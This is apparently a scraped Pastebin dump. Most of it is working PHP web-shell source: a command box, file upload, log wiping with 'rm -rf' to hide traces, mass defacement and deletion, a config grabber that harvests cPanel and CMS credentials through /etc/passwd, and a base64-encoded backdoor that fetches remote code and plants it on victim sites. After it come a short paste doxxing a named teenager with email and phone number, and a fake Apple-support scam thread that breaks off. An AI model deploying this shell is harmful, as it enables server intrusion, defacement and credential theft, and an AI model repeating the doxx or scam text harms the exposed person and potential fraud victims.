if(@copy($_FILES['ix_file']['tmp_name'], $root)) {\r\n                    $act = \"<font color=blue>Uploaded!<\/font> at <i><b>$root -> <\/b><\/i><a href='http:\/\/$web' target='_blank'>$web<\/a>\";\r\n                } else {\r\n                    $act = \"<font color=red>failed to upload file<\/font>\";\r\n                }\r\n            } else {\r\n                $act = \"<font color=red>failed to upload file<\/font>\";\r\n            }\r\n        }\r\n    }\r\n    echo \"Upload File:\r\n    <form method='post' enctype='multipart\/form-data'>\r\n    <input type='radio' name='tipe_upload' value='biasa' checked>Biasa [ \".w($dir,\"Writeable\").\" ]\r\n    <input type='radio' name='tipe_upload' value='home_root'>home_root [ \".w($_SERVER['DOCUMENT_ROOT'],\"Writeable\").\" ]<br>\r\n    <input type='file' name='ix_file'>\r\n    <input type='submit' value='upload' name='upload'>\r\n    <\/form>\";\r\n    echo $act;\r\n    echo \"<form method='post'>\r\n\t<font style='text-decoration: underline;'><\/font>\r\n\t<input type='text' size='30' height='10' name='cmd'><input type='submit' name='do_cmd' value='>>'>\r\n\t<\/form>\";\r\n    echo \"<\/center>\";\r\n    } elseif($_GET['saf'] == 'adminer') {\r\n\t$full = str_replace($_SERVER['DOCUMENT_ROOT'], \"\", $dir);\r\n\tfunction adminer($url, $isi) {\r\n\t\t$fp = fopen($isi, \"w\");\r\n\t\t$ch = curl_init();\r\n\t\t \t  curl_setopt($ch, CURLOPT_URL, $url);\r\n\t\t \t  curl_setopt($ch, CURLOPT_BINARYTRANSFER, true);\r\n\t\t \t  curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);\r\n\t\t \t  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);\r\n\t\t   \t  curl_setopt($ch, CURLOPT_FILE, $fp);\r\n\t\treturn curl_exec($ch);\r\n\t\t   \t  curl_close($ch);\r\n\t\tfclose($fp);\r\n\t\tob_flush();\r\n\t\tflush();\r\n\t}\r\n\tif(file_exists('adminer.php')) {\r\n\t\techo \"<center><font color=lime><a href='$full\/adminer.php' target='_blank'>-> adminer login <-<\/a><\/font><\/center>\";\r\n\t} else {\r\n\t\tif(adminer(\"https:\/\/www.adminer.org\/static\/download\/4.2.4\/adminer-4.2.4.php\",\"adminer.php\")) {\r\n\t\t\techo \"<center><font color=lime><a href='$full\/adminer.php' target='_blank'>-> adminer login <-<\/a><\/font><\/center>\";\r\n\t\t} else {\r\n\t\t\techo \"<center><font color=red>gagal buat file adminer<\/font><\/center>\";\r\n\t\t}\r\n\t}\r\n\t} elseif($_GET['delete'] == 'logs') {\r\n  \techo '<br><center><b><span>Delete Logs ( For Safe )<\/span><\/b><center><br>';\r\n\techo \"<table style='margin: 0 auto;'><tr valign='top'><td align='left'>\";      \r\n\texec(\"rm -rf \/tmp\/logs\");\r\n\texec(\"rm -rf \/root\/.ksh_history\");\r\n\texec(\"rm -rf \/root\/.bash_history\");\r\n\texec(\"rm -rf \/root\/.bash_logout\");\r\n\texec(\"rm -rf \/usr\/local\/apache\/logs\");\r\n\texec(\"rm -rf \/usr\/local\/apache\/log\");\r\n\texec(\"rm -rf \/var\/apache\/logs\");\r\n\texec(\"rm -rf \/var\/apache\/log\");\r\n\texec(\"rm -rf \/var\/run\/utmp\");\r\n\texec(\"rm -rf \/var\/logs\");\r\n\texec(\"rm -rf \/var\/log\");\r\n\texec(\"rm -rf \/var\/adm\");\r\n\texec(\"rm -rf \/etc\/wtmp\");\r\n\texec(\"rm -rf \/etc\/utmp\");\r\n\texec(\"rm -rf $HISTFILE\");\r\n\texec(\"rm -rf \/var\/log\/lastlog\");\r\n\texec(\"rm -rf \/var\/log\/wtmp\");\r\n\r\n\tshell_exec(\"rm -rf \/tmp\/logs\");\r\n\tshell_exec(\"rm -rf \/root\/.ksh_history\");\r\n\tshell_exec(\"rm -rf \/root\/.bash_history\");\r\n\tshell_exec(\"rm -rf \/root\/.bash_logout\");\r\n\tshell_exec(\"rm -rf \/usr\/local\/apache\/logs\");\r\n\tshell_exec(\"rm -rf \/usr\/local\/apache\/log\");\r\n\tshell_exec(\"rm -rf \/var\/apache\/logs\");\r\n\tshell_exec(\"rm -rf \/var\/apache\/log\");\r\n\tshell_exec(\"rm -rf \/var\/run\/utmp\");\r\n\tshell_exec(\"rm -rf \/var\/logs\");\r\n\tshell_exec(\"rm -rf \/var\/log\");\r\n\tshell_exec(\"rm -rf \/var\/adm\");\r\n\tshell_exec(\"rm -rf \/etc\/wtmp\");\r\n\tshell_exec(\"rm -rf \/etc\/utmp\");\r\n\tshell_exec(\"rm -rf $HISTFILE\");\r\n\tshell_exec(\"rm -rf \/var\/log\/lastlog\");\r\n\tshell_exec(\"rm -rf \/var\/log\/wtmp\");\r\n\r\n\tpassthru(\"rm -rf \/tmp\/logs\");\r\n\tpassthru(\"rm -rf \/root\/.ksh_history\");\r\n\tpassthru(\"rm -rf \/root\/.bash_history\");\r\n\tpassthru(\"rm -rf \/root\/.bash_logout\");\r\n\tpassthru(\"rm -rf \/usr\/local\/apache\/logs\");\r\n\tpassthru(\"rm -rf \/usr\/local\/apache\/log\");\r\n\tpassthru(\"rm -rf \/var\/apache\/logs\");\r\n\tpassthru(\"rm -rf \/var\/apache\/log\");\r\n\tpassthru(\"rm -rf \/var\/run\/utmp\");\r\n\tpassthru(\"rm -rf \/var\/logs\");\r\n\tpassthru(\"rm -rf \/var\/log\");\r\n\tpassthru(\"rm -rf \/var\/adm\");\r\n\tpassthru(\"rm -rf \/etc\/wtmp\");\r\n\tpassthru(\"rm -rf \/etc\/utmp\");\r\n\tpassthru(\"rm -rf $HISTFILE\");\r\n\tpassthru(\"rm -rf \/var\/log\/lastlog\");\r\n\tpassthru(\"rm -rf \/var\/log\/wtmp\");\r\n\r\n\r\n\tsystem(\"rm -rf \/tmp\/logs\");\r\n\tsleep(2);\r\n\techo'<br>Deleting ...\/tmp\/logs ';\r\n\tsleep(2);\r\n\r\n\tsystem(\"rm -rf \/root\/.bash_history\");\r\n\tsleep(2);\r\n\techo'<p>Deleting ...\/root\/.bash_history <\/p>';\r\n\r\n\tsystem(\"rm -rf \/root\/.ksh_history\");\r\n\tsleep(2);\r\n\techo'<p>Deleting ...\/root\/.ksh_history <\/p>';\r\n\r\n\tsystem(\"rm -rf \/root\/.bash_logout\");\r\n\tsleep(2);\r\n\techo'<p>Deleting ...\/root\/.bash_logout <\/p>';\r\n\r\n\tsystem(\"rm -rf \/usr\/local\/apache\/logs\");\r\n\tsleep(2);\r\n\techo'<p>Deleting ...\/usr\/local\/apache\/logs <\/p>';\r\n\r\n\tsystem(\"rm -rf \/usr\/local\/apache\/log\");\r\n\tsleep(2);\r\n\techo'<p>Deleting ...\/usr\/local\/apache\/log <\/p>';\r\n\r\n\tsystem(\"rm -rf \/var\/apache\/logs\");\r\n\tsleep(2);\r\n\techo'<p>Deleting ...\/var\/apache\/logs <\/p>';\r\n\r\n\tsystem(\"rm -rf \/var\/apache\/log\");\r\n\tsleep(2);\r\n\techo'<p>Deleting ...\/var\/apache\/log <\/p>';\r\n\r\n\tsystem(\"rm -rf \/var\/run\/utmp\");\r\n\tsleep(2);\r\n\techo'<p>Deleting ...\/var\/run\/utmp <\/p>';\r\n\r\n\tsystem(\"rm -rf \/var\/logs\");\r\n\tsleep(2);\r\n\techo'<p>Deleting ...\/var\/logs <\/p>';\r\n\r\n\tsystem(\"rm -rf \/var\/log\");\r\n\tsleep(2);\r\n\techo'<p>Deleting ...\/var\/log <\/p>';\r\n\r\n\tsystem(\"rm -rf \/var\/adm\");\r\n\tsleep(2);\r\n\techo'<p>Deleting ...\/var\/adm <\/p>';\r\n\r\n\tsystem(\"rm -rf \/etc\/wtmp\");\r\n\tsleep(2);\r\n\techo'<p>Deleting ...\/etc\/wtmp <\/p>';\r\n\r\n\tsystem(\"rm -rf \/etc\/utmp\");\r\n\tsleep(2);\r\n\techo'<p>Deleting ...\/etc\/utmp <\/p>';\r\n\r\n\tsystem(\"rm -rf $HISTFILE\");\r\n\tsleep(2);\r\n\techo'<p>Deleting ...$HISTFILE <\/p>'; \r\n\r\n\tsystem(\"rm -rf \/var\/log\/lastlog\");\r\n\tsleep(2);\r\n\techo'<p>Deleting ...\/var\/log\/lastlog <\/p>';\r\n\r\n\tsystem(\"rm -rf \/var\/log\/wtmp\");\r\n\tsleep(2);\r\n\techo'<p>Deleting ...\/var\/log\/wtmp <\/p>';\r\n\r\n\tsleep(4);\r\n\r\n\techo '<br><br><p>Your Traces Has Been Successfully Deleting ...From the Server';\r\n\techo\"<\/td><\/tr><\/table>\";\r\n\t }elseif($_GET['saf'] == 'info') {\r\necho\"<font size='3'><pre>\";\r\necho \"System:\".$kernel.\"<\/font><br>\";\r\necho \"Server IP: <font color=blue>\".$ip.\"<\/font> | Your IP: <font color=blue>\".$_SERVER['REMOTE_ADDR'].\"<\/font><br>\";\r\necho \"HDD: <font color=blue>$used<\/font> \/ <font color=blue>$total<\/font> ( Free: <font color=blue>$freespace<\/font> )<br>\";\r\necho \"Safe Mode: $sm<br>\";\r\necho \"Disable Functions: $show_ds<br>\";\r\necho \"User: \".$user.\" (\".$uid.\") Group: \".$group.\" (\".$gid.\")<br>\";\r\necho \"MySQL: $mysql | Perl: $perl | Python: $python | WGET: $wget | CURL: $curl<\/pre> <br>\";\r\n} elseif($_GET['saf'] == '406') {\r\n?>\r\n<form method=\"post\">\r\n<input type=\"submit\" name=\"x\" value=\"406.php\">\r\n<\/form>\r\n<?php\r\n$target = explode(\"rn\", $_POST['target']);\r\nif($_POST['x']) {\r\n    foreach($target as $korban) {\r\n        $global = \"406.php\";\r\n        $isi_nama_doang = \"PD9waHANCiMgSW5kb1hwbG9pdCBUTVAgQmFja2Rvb3INCiMgQnlwYXNzIDQwNiBOb3QgQWNjZXB0YWJsZSAmIEF1dG8gRGVsZXRlIFNoZWxsIChXQUYgRXZhc2lvbiBTaGVsbCkNCiMgQ29kZWQgYnk6IEwwYzRsaDM0cnR6IC0gSW5kb1hwbG9pdA0KDQokZGF0YSA9IFsnaHR0cHM6Ly93d3cuaW5kb3hwbG9pdC5vci5pZC9yZXBvc2l0b3J5L2luZG94cGxvaXRfdjMudHh0JywgJy90bXAvc2Vzc18nLm1kNSgkX1NFUlZFUlsnSFRUUF9IT1NUJ10pLicucGhwJ107DQoNCmlmKGZpbGVfZXhpc3RzKCRkYXRhWzFdKSAmJiBmaWxlc2l6ZSgkZGF0YVsxXSkgIT09IDApIHsNCiAgICBpbmNsdWRlKCRkYXRhWzFdKTsNCn0gZWxzZSB7DQogICAgJGZvcGVuID0gZm9wZW4oJGRhdGFbMV0sICd3KycpOw0KICAgIGZ3cml0ZSgkZm9wZW4sIGdldCgkZGF0YVswXSkpOw0KICAgIGZjbG9zZSgkZm9wZW4pOw0KICAgIGVjaG8gJzxzY3JpcHQ+d2luZG93LmxvY2F0aW9uPSI\/aW5kb3hwbG9pdCI7PC9zY3JpcHQ+JzsNCn0NCg0KZnVuY3Rpb24gZ2V0KCR1cmwpIHsNCiAgICAkY2ggPSBjdXJsX2luaXQoKTsNCiAgICAgICAgICBjdXJsX3NldG9wdCgkY2gsIENVUkxPUFRfUkVUVVJOVFJBTlNGRVIsIFRSVUUpOw0KICAgICAgICAgIGN1cmxfc2V0b3B0KCRjaCwgQ1VSTE9QVF9VUkwsICR1cmwpOw0KICAgICAgICAgIGN1cmxfc2V0b3B0KCRjaCwgQ1VSTE9QVF9TU0xfVkVSSUZZSE9TVCwgRkFMU0UpOw0KICAgICAgICAgIGN1cmxfc2V0b3B0KCRjaCwgQ1VSTE9QVF9TU0xfVkVSSUZZUEVFUiwgRkFMU0UpOw0KICAgIHJldHVybiBjdXJsX2V4ZWMoJGNoKTsNCiAgICAgICAgICBjdXJsX2Nsb3NlKCRjaCk7DQp9DQo\/Pg==\";\r\n        $decode_isi = base64_decode($isi_nama_doang);\r\n        $encode = base64_encode($global);\r\n        $ss = fopen($global,\"w\");\r\n        fputs($ss, $decode_isi);\r\n        echo \"[+] <a href='$korban' target='_blank'>$korban<\/a> <br>\";\r\n        echo \"Done 406.php<br>\";\r\n        $url_mkfile = \"$korban?cmd=mkfile&name=$global&target=l1_Lw\";\r\n        $post1 = array(\r\n                \"target\" => \"l1_$encode\",\r\n                \"content\" => \"$decode_isi\",);\r\n        $post2 = array( \"upload[]\" => \"@$global\",);\r\n        $output_mkfile = ngirim(\"$korban\", $post1);\r\n            $upload_ah = ngirim(\"$korban?cmd=upload\", $post2);\r\n            }\r\n        }\r\n\t}elseif($_GET['saf'] == 'about') {\r\n\t\techo\"resVh0st Indonesian Defacer<br>indoezcyber@gnail.com<br>Shell Ini Tidak sepenuh nya coding sendiri Ya Thankd to All<br>IndoXploit , N45HT , Con7ext<br><li> <a href='?dir=$dir&kill=self'>HIDDEN<\/b><\/a><\/li><\/div><br>\";\r\n\t} elseif($_GET['saf'] == 'mass') {\r\n\techo \"<center><form action=\\\"\\\" method=\\\"post\\\">\\n\";\r\n\t$dirr=$_POST['d_dir'];\r\n\t$index = $_POST[\"script\"];\r\n\t$index = str_replace('\"',\"'\",$index);\r\n\t$index = stripslashes($index);\r\n\tfunction edit_file($file,$index){\r\n\t\tif (is_writable($file)) {\r\n\t\tclear_fill($file,$index);\r\n\t\techo \"<Span style='color:green;'><strong> [+] Nyabun 100% Successfull <\/strong><\/span><br><\/center>\";\r\n\t\t} \r\n\t\telse {\r\n\t\t\techo \"<Span style='color:red;'><strong> [-] Ternyata Tidak Boleh Menyabun Disini :( <\/strong><\/span><br><\/center>\";\r\n\t\t\t}\r\n\t\t\t}\r\n\tfunction hapus_massal($dir,$namafile) {\r\n\t\tif(is_writable($dir)) {\r\n\t\t\t$dira = scandir($dir);\r\n\t\t\tforeach($dira as $dirb) {\r\n\t\t\t\t$dirc = \"$dir\/$dirb\";\r\n\t\t\t\t$lokasi = $dirc.'\/'.$namafile;\r\n\t\t\t\tif($dirb === '.') {\r\n\t\t\t\t\tif(file_exists(\"$dir\/$namafile\")) {\r\n\t\t\t\t\t\tunlink(\"$dir\/$namafile\");\r\n\t\t\t\t\t}\r\n\t\t\t\t} elseif($dirb === '..') {\r\n\t\t\t\t\tif(file_exists(\"\".dirname($dir).\"\/$namafile\")) {\r\n\t\t\t\t\t\tunlink(\"\".dirname($dir).\"\/$namafile\");\r\n\t\t\t\t\t}\r\n\t\t\t\t} else {\r\n\t\t\t\t\tif(is_dir($dirc)) {\r\n\t\t\t\t\t\tif(is_writable($dirc)) {\r\n\t\t\t\t\t\t\tif(file_exists($lokasi)) {\r\n\t\t\t\t\t\t\t\techo \"<font color=lime>><\/font> $lokasi<br>\";\r\n\t\t\t\t\t\t\t\tunlink($lokasi);\r\n\t\t\t\t\t\t\t\t$idx = hapus_massal($dirc,$namafile);\r\n\t\t\t\t\t\t\t}\r\n\t\t\t\t\t\t}\r\n\t\t\t\t\t}\r\n\t\t\t\t}\r\n\t\t\t}\r\n\t\t}\r\n\t}\r\n\tfunction clear_fill($file,$index){\r\n\t\tif(file_exists($file)){\r\n\t\t\t$handle = fopen($file,'w');\r\n\t\t\tfwrite($handle,'');\r\n\t\t\tfwrite($handle,$index);\r\n\t\t\tfclose($handle);  } }\r\n\r\n\tfunction gass(){\r\n\t\tglobal $dirr , $index ;\r\n\t\tchdir($dirr);\r\n\t\t$me = str_replace(dirname(__FILE__).'\/','',__FILE__);\r\n\t\t$files = scandir($dirr) ;\r\n\t\t$notallow = array(\".htaccess\",\"error_log\",\"_vti_inf.html\",\"_private\",\"_vti_bin\",\"_vti_cnf\",\"_vti_log\",\"_vti_pvt\",\"_vti_txt\",\"cgi-bin\",\".contactemail\",\".cpanel\",\".fantasticodata\",\".htpasswds\",\".lastlogin\",\"access-logs\",\"cpbackup-exclude-used-by-backup.conf\",\".cgi_auth\",\".disk_usage\",\".statspwd\",\"..\",\".\");\r\n\t\tsort($files);\r\n\t\t$n = 0 ;\r\n\t\tforeach ($files as $file){\r\n\t\t\tif ( $file != $me && is_dir($file) != 1 && !in_array($file, $notallow) ) {\r\n\t\t\t\techo \"<center><Span style='color: #8A8A8A;'><strong>$dirr\/<\/span>$file<\/strong> ====> \";\r\n\t\t\t\tedit_file($file,$index);\r\n\t\t\t\tflush();\r\n\t\t\t\t$n = $n +1 ;\r\n\t\t\t\t} \r\n\t\t\t\t}\r\n\t\t\t\techo \"<br>\";\r\n\t\t\t\techo \"<center><br><h3>$n Kali Anda Telah Ngecrot  Disini <\/h3><\/center><br>\";\r\n\t\t\t\t\t}\r\n\tfunction ListFiles($dirrall) {\r\n\r\n    if($dh = opendir($dirrall)) {\r\n\r\n       $files = Array();\r\n       $inner_files = Array();\r\n       $me = str_replace(dirname(__FILE__).'\/','',__FILE__);\r\n       $notallow = array($me,\".htaccess\",\"error_log\",\"_vti_inf.html\",\"_private\",\"_vti_bin\",\"_vti_cnf\",\"_vti_log\",\"_vti_pvt\",\"_vti_txt\",\"cgi-bin\",\".contactemail\",\".cpanel\",\".fantasticodata\",\".htpasswds\",\".lastlogin\",\"access-logs\",\"cpbackup-exclude-used-by-backup.conf\",\".cgi_auth\",\".disk_usage\",\".statspwd\",\"Thumbs.db\");\r\n        while($file = readdir($dh)) {\r\n            if($file != \".\" && $file != \"..\" && $file[0] != '.' && !in_array($file, $notallow) ) {\r\n                if(is_dir($dirrall . \"\/\" . $file)) {\r\n                    $inner_files = ListFiles($dirrall . \"\/\" . $file);\r\n                    if(is_array($inner_files)) $files = array_merge($files, $inner_files);\r\n                } else {\r\n                    array_push($files, $dirrall . \"\/\" . $file);\r\n                }\r\n            }\r\n\t\t\t}\r\n\r\n\t\t\tclosedir($dh);\r\n\t\t\treturn $files;\r\n\t\t}\r\n\t}\r\n\tfunction gass_all(){\r\n\t\tglobal $index ;\r\n\t\t$dirrall=$_POST['d_dir'];\r\n\t\tforeach (ListFiles($dirrall) as $key=>$file){\r\n\t\t\t$file = str_replace('\/\/',\"\/\",$file);\r\n\t\t\techo \"<center><strong>$file<\/strong> ===>\";\r\n\t\t\tedit_file($file,$index);\r\n\t\t\tflush();\r\n\t\t}\r\n\t\t$key = $key+1;\r\n\techo \"<center><br><h3>$key Kali Anda Telah Ngecrot  Disini  <\/h3><\/center><br>\"; }\r\n\tfunction sabun_massal($dir,$namafile,$isi_script) {\r\n\t\tif(is_writable($dir)) {\r\n\t\t\t$dira = scandir($dir);\r\n\t\t\tforeach($dira as $dirb) {\r\n\t\t\t\t$dirc = \"$dir\/$dirb\";\r\n\t\t\t\t$lokasi = $dirc.'\/'.$namafile;\r\n\t\t\t\tif($dirb === '.') {\r\n\t\t\t\t\tfile_put_contents($lokasi, $isi_script);\r\n\t\t\t\t} elseif($dirb === '..') {\r\n\t\t\t\t\tfile_put_contents($lokasi, $isi_script);\r\n\t\t\t\t} else {\r\n\t\t\t\t\tif(is_dir($dirc)) {\r\n\t\t\t\t\t\tif(is_writable($dirc)) {\r\n\t\t\t\t\t\t\techo \"[<font color=lime>DONE<\/font>] $lokasi<br>\";\r\n\t\t\t\t\t\t\tfile_put_contents($lokasi, $isi_script);\r\n\t\t\t\t\t\t\t$idx = sabun_massal($dirc,$namafile,$isi_script);\r\n\t\t\t\t\t\t}\r\n\t\t\t\t\t}\r\n\t\t\t\t}\r\n\t\t\t}\r\n\t\t}\r\n\t}\r\n\tif($_POST['mass'] == 'onedir') {\r\n\t\techo \"<br> Versi Text Area<br><textarea style='background:black;outline:none;color:red;' name='index' rows='10' cols='67'>\\n\";\r\n\t\t$ini=\"http:\/\/\";\r\n\t\t$mainpath=$_POST[d_dir];\r\n\t\t$file=$_POST[d_file];\r\n\t\t$dir=opendir(\"$mainpath\");\r\n\t\t$code=base64_encode($_POST[script]);\r\n\t\t$indx=base64_decode($code);\r\n\t\twhile($row=readdir($dir)){\r\n\t\t$start=@fopen(\"$row\/$file\",\"w+\");\r\n\t\t$finish=@fwrite($start,$indx);\r\n\t\tif ($finish){\r\n\t\t\techo\"$ini$row\/$file\\n\";\r\n\t\t\t}\r\n\t\t}\r\n\t\techo \"<\/textarea><br><br><br><b>Versi Text<\/b><br><br><br>\\n\";\r\n\t\t$mainpath=$_POST[d_dir];$file=$_POST[d_file];\r\n\t\t$dir=opendir(\"$mainpath\");\r\n\t\t$code=base64_encode($_POST[script]);\r\n\t\t$indx=base64_decode($code);\r\n\t\twhile($row=readdir($dir)){$start=@fopen(\"$row\/$file\",\"w+\");\r\n\t\t$finish=@fwrite($start,$indx);\r\n\t\tif ($finish){echo '<a href=\"http:\/\/' . $row . '\/' . $file . '\" target=\"_blank\">http:\/\/' . $row . '\/' . $file . '<\/a><br>'; }\r\n\t\t}\r\n\r\n\t}\r\n\telseif($_POST['mass'] == 'sabunkabeh') { gass(); }\r\n\telseif($_POST['mass'] == 'hapusmassal') { hapus_massal($_POST['d_dir'], $_POST['d_file']); }\r\n\telseif($_POST['mass'] == 'sabunmematikan') { gass_all(); }\r\n\telseif($_POST['mass'] == 'massdeface') {\r\n\t\techo \"<div style='margin: 5px auto; padding: 5px'>\";\r\n\t\tsabun_massal($_POST['d_dir'], $_POST['d_file'], $_POST['script']);\r\n\t\techo \"<\/div>\";\t}\r\n\telse {\r\n\t\techo \"\r\n\t\t<center><font style='text-decoration: underline;'>\r\n\t\tSelect Type:<br>\r\n\t\t<\/font>\r\n\t\t<select class=\\\"select\\\" name=\\\"mass\\\"  style=\\\"width: 450px;\\\" height=\\\"10\\\">\r\n\t\t<option value=\\\"onedir\\\">Mass Deface 1 Dir<\/option>\r\n\t\t<option value=\\\"massdeface\\\">Mass Deface ALL Dir<\/option>\r\n\t\t<option value=\\\"sabunkabeh\\\">Sabun Massal Di Tempat<\/option>\r\n\t\t<option value=\\\"sabunmematikan\\\">Sabun Massal Bunuh Diri<\/option>\r\n\t\t<option value=\\\"hapusmassal\\\">Mass Delete Files<\/option><\/center><\/select><br>\r\n\t\t<font style='text-decoration: underline;'>Folder:<\/font><br>\r\n\t\t<input type='text' name='d_dir' value='$dir' style='width: 450px;' height='10'><br>\r\n\t\t<font style='text-decoration: underline;'>Filename:<\/font><br>\r\n\t\t<input type='text' name='d_file' value='index1.php' style='width: 450px;' height='10'><br>\r\n\t\t<font style='text-decoration: underline;'>Index File:<\/font><br>\r\n\t\t<textarea name='script' style='width: 450px; height: 200px;'>Hacked By Mr.r3NduX69<\/textarea><br>\r\n\t\t<input type='submit' name='start' value='Mass Deface' style='width: 450px;'>\r\n\t\t<\/form><\/center>\";\r\n\t\t}\r\n\t\t} elseif($_GET['saf'] == 'config') {\r\n\t$etc = fopen(\"\/etc\/passwd\", \"r\") or die(\"<pre><font color=red>Can't read \/etc\/passwd<\/font><\/pre>\");\r\n\t$idx = mkdir(\"idx_config\", 0777);\r\n\t$isi_htc = \"Options allnRequire NonenSatisfy Any\";\r\n\t$htc = fopen(\"idx_config\/.htaccess\",\"w\");\r\n\tfwrite($htc, $isi_htc);\r\n\twhile($passwd = fgets($etc)) {\r\n\t\tif($passwd == \"\" || !$etc) {\r\n\t\t\techo \"<font color=red>Can't read \/etc\/passwd<\/font>\";\r\n\t\t} else {\r\n\t\t\tpreg_match_all('\/(.*?):x:\/', $passwd, $user_config);\r\n\t\t\tforeach($user_config[1] as $user_idx) {\r\n\t\t\t\t$user_config_dir = \"\/home\/$user_idx\/public_html\/\";\r\n\t\t\t\tif(is_readable($user_config_dir)) {\r\n\t\t\t\t\t$grab_config = array(\r\n\t\t\t\t\t\t\"\/home\/$user_idx\/.my.cnf\" => \"cpanel\",\r\n\t\t\t\t\t\t\"\/home\/$user_idx\/.accesshash\" => \"WHM-accesshash\",\r\n\t\t\t\t\t\t\"\/home\/$user_idx\/public_html\/po-content\/config.php\" => \"Popoji\",\r\n\t\t\t\t\t\t\"\/home\/$user_idx\/public_html\/vdo_config.php\" => \"Voodoo\",\r\n\t\t\t\t\t\t\"\/home\/$user_idx\/public_html\/bw-configs\/config.ini\" => \"BosWeb\",\r\n\t\t\t\t\t\t\"\/home\/$user_idx\/public_html\/config\/koneksi","domain":["a-msedge.net","ww3s.ws","pastebin.com","web-hosting.com","googleapis.com","yougetsignal.com","bing.com","1e100.net","amazonaws.com","adminer.org","gigabyte.com"],"file":["dist-configure.php","ws.php","local.xml","adminer.php","vdo_config.php","406.php","koneksi.php","b374k.php","4.php","inc.php","slconfig.php","-lokomedia.txt","bb-config.php","raw.php","iso4217.php","wp-config.php","-opencart.txt","nama_config.txt","test.txt","newfile.php","sites.txt","-magento.txt","configure.php","wso.php","ok.php","-prestashop.txt","submitticket.php","configuration.php","index1.php","database.php","domains.php","-joomla.txt","wp-login.php","settings.php","brudul.txt","-phpbb.txt","config.php","conf_global.php","-ellislab.txt","-drupal.txt","-wordpress.txt"],"host":["par10s21-in-f202","par10s21-in-f10","www","fonts","domains","par10s38-in-x0a","ec2-54-79-123-29","par10s21-in-x04","a-0001","ec2-13-238-64-68","ec2-52-65-218-80","par10s21-in-f196","par10s21-in-f4","server145-2"],"hostname":["par10s21-in-f10.1e100.net","server145-2.web-hosting.com","par10s21-in-f202.1e100.net","par10s38-in-x0a.1e100.net","par10s21-in-f4.1e100.net","ec2-13-238-64-68.ap-southeast-2.compute.amazonaws.com","par10s21-in-x04.1e100.net","www.gigabyte.com","ec2-54-79-123-29.ap-southeast-2.compute.amazonaws.com","ec2-52-65-218-80.ap-southeast-2.compute.amazonaws.com","par10s21-in-f196.1e100.net","fonts.googleapis.com","www.bing.com","www.adminer.org","domains.yougetsignal.com","a-0001.a-msedge.net"],"ip":["2606:4700:10:0:0:0:6814:d115","52.65.218.80","104.28.6.67","13.107.21.200","2a00:1450:4007:805:0:0:0:200a","204.79.197.200","2606:4700:10:0:0:0:6814:d015","104.20.208.21","216.58.208.196","162.213.255.34","152.195.132.207","216.58.208.202","13.238.64.68","104.28.7.67","2a00:1450:4007:80d:0:0:0:2004","104.20.209.21","54.79.123.29"],"key":"v8HP8J7i","scheme":["http","https"],"seen_date":"2018-11-16","size":"113802","source":"pastebin","subdomains":["ap-southeast-2.compute.amazonaws.com","compute.amazonaws.com"],"syntax":"text","tld":["org","com","ws","net"],"url":["http:\/\/domains.yougetsignal.com\/domains.php","https:\/\/www.adminer.org\/static\/download\/4.2.4\/adminer-4.2.4.php","https:\/\/www.gigabyte.com\/FileUpload\/Global\/GMicroSite\/93\/Activity\/436\/images\/mb_aoruslogo.png","http:\/\/www.bing.com\/search?q=","https:\/\/pastebin.com\/raw\/jWSt6pnW","http:\/\/pastebin.com\/raw.php?i=cR71LiMp","http:\/\/$lnk","https:\/\/fonts.googleapis.com\/css?family=Quicksand","http:\/\/$web","http:\/\/$dj\/","http:\/\/ww3s.ws\/ok.php","http:\/\/www."]},{"@category":"pastries","@timestamp":"2018-11-16T09:28:33.000Z","@type":"doc","content":"Hacked by BaKuZo\r\n \r\nAGE 17 ANS\r\n \r\nPR�NOM ROBIN PAVY\r\n(Chaine youtube)\r\nrobin.59450@gmail.com\r\nRobin59250\r\nNum de tel:06 74 75 85 96\r\nVILLE DUNKERQUE\r\nNORD PAS-DE-CALAIS","key":"SDkXehRQ","seen_date":"2018-11-16","size":"172","source":"pastebin","syntax":"cpp","title":"HACKED By BaKuZo"},{"@category":"pastries","@timestamp":"2018-11-16T09:26:49.000Z","@type":"doc","content":"Hacked by BaKuZo\r\n\r\nAGE 17 ANS \r\n\r\nPR�NOM ROBIN\r\n(Chaine youtube)\r\nrobin.59450@gmail.com\r\nRobin59250\r\nNum de tel:06 74 75 85 96","key":"pcq3r2aR","seen_date":"2018-11-16","size":"132","source":"pastebin","syntax":"cpp","title":"HACKED By BaKuZo"},{"@category":"pastries","@timestamp":"2018-11-16T08:20:27.000Z","@type":"doc","content":"OFFICIAL APPLE officialapplee@yahoo.com\r\nMar 4\r\n \r\nto me\r\nOFFICIAL APPLE ALERT! OFFICIAL APPLE ALERT!\r\n \r\nYOUR APPLE\/GOOGLE\/YAHOO EMAIL MAY HAVE BEEN COMPROMISED! YOUR APPLE\/GOOGLE\/YAHOO EMAIL MAY HAVE BEEN COMPROMISED!\r\n \r\nHERE AT APPLE WE MONITOR, PROTECT YOUR EMAIL AND DATA. WE HAVE DETECTED AN UNUSUAL LOGIN ONTO YOUR EMAIL APPLE ACCOUNT.\r\n \r\nIF THIS LOGIN DATA FOLLOWING IS NOT YOURS, YOU SHOULD RESPOND IMMEDIATELY. YOUR DATA AND CREDIT CARD DOLLARS MAY BE AT RISK.\r\n \r\nLOCATION OF LOGON: MOSCOW, RUSSIA\r\nBROWSER: INTERNET\r\nOPERATING SYSTEM: IPHONE\r\nINTERNET IP ADRESS: 939104\r\n \r\nIF THIS IS NOT YOU MUST RESPOND IMMEDIATELY FOR SAFETY AND PROTECTION OF DATA, EMAILS.\r\n>THIS IS AN AUTOMATED APPLE EMAIL BEEP\r\n \r\nBrad Quinto bquinto123@gmail.com\r\nMar 4\r\n \r\nto OFFICIAL\r\nThe above logon was NOT me. I have never been to Russia, I don't use Internet Browser, I don't use Iphone, and that's not my IP address. Please secure my account! I am very worried because I have personal information in my emails, like my passwords and credit card information Sincerely,\r\nBrad Quinto\r\n \r\nOFFICIAL APPLE\r\nMar 4\r\n \r\nto me\r\nHello, this is Tonya, a Apple security employee. I will help you with the problem.\r\nI have looked into the files of your account.It was registered in Russia, Nigeria, the Middle East.\r\nIt was attacked by hackers used the Brute Force Python Programming Attack and they found your password and email address.\r\nThen they downloaded all data, emails and use it to steal your identity, money, data.They begin now with small fees, and they continue to take small fees from your bank account until it is exhausted. They know how to hide accusations, fees so that they are not found, caught.\r\nThey are very hard to find and find. When they are found, they take all the money from your bank account right away, because they do not care about not being found again.\r\nHowever, at Apple we care about foresight. We have backdoors into all emails so that we can delete them remotely and delete all personal, confidential data from emails. However, this is top secret and I may be 